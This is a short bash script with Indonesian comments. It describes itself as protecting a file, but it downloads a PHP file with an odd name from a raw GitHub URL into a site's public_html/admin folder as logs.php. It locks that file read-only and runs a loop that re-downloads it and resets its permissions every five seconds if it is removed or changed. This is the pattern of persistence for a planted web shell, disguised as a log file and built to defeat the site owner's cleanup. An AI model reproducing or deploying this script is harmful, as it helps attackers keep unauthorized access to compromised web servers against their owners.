#!/bin/bash

# Ganti dengan path file yang ingin dilindungi
FILE_PATH='/home/co4o0rj9l6vf/public_html/admin/logs.php'
BACKUP_URL='https://raw.githubusercontent.com/slavination/odinastic/refs/heads/main/encalf.php'

# Fungsi untuk mengatur permission file menjadi 555
set_permissions() {
  chmod 555 "$FILE_PATH"
}

# Fungsi untuk mengembalikan file dari backup URL
restore_file() {
  wget -q -O "$FILE_PATH" "$BACKUP_URL"
  if [ $? -eq 0 ]; then
    echo "$FILE_PATH telah dipulihkan dari backup."
    set_permissions
  else
    echo "Gagal mengunduh file dari backup."
  fi
}

# Fungsi untuk memonitor file dan restore jika perlu
monitor_file() {
  while true; do
    # Cek apakah file ada
    if [ ! -f "$FILE_PATH" ]; then
      echo "$FILE_PATH telah dihapus. Mengembalikan file..."
      restore_file
    fi

    # Cek permission file
    CURRENT_PERMISSIONS=$(stat -c "%a" "$FILE_PATH")
    if [ "$CURRENT_PERMISSIONS" != "555" ]; then
      echo "Permission file $FILE_PATH telah berubah. Mengatur ulang ke 555..."
      set_permissions
    fi

    sleep 5
  done
}

# Jalankan fungsi-fungsi
set_permissions
monitor_file
